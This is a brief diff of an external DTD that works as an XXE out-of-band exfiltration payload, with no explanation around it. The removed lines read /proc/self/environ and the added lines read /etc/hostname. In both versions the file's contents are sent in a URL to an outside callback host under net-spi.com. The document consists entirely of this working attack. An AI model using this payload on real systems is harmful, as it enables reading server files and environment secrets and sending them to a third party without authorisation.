@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///proc/self/environ">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3hlaebbzghqctmx99fdz3bz0brhi5ct1.net-spi.com/?x=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mndtkuhim0wvz53sfyji9u5jhan1byzn.net-spi.com/?x=%file;'>">
 %eval;
 %exfil;
